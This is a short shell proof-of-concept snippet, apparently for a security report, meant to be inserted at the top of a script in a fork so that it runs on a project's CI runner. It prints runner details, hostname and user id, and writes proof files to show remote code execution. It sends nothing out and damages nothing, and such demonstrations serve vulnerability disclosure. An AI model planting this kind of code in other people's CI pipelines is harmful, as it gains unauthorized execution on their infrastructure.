# ---- POC START (insert at very top in your fork B) ----
echo "[POC] Fork code executed on runner"
echo "[POC] RUNNER_ENVIRONMENT=${RUNNER_ENVIRONMENT:-unknown}"
echo "[POC] RUNNER_NAME=${RUNNER_NAME:-unknown}"
echo "[POC] RUNNER_OS=${RUNNER_OS:-?} / RUNNER_ARCH=${RUNNER_ARCH:-?}"
hostname || true
id || true
echo "poc $(date -u +%FT%TZ) ${RUNNER_NAME:-unknown}" >> /tmp/poc_rce_proof.txt || true
echo -e "### RCE PoC\nRunner: ${RUNNER_NAME}\nEnv: ${RUNNER_ENVIRONMENT}\nHost: $(hostname)" >> "${GITHUB_STEP_SUMMARY}"
# ---- POC END ----
# (keep the original script content below untouched)
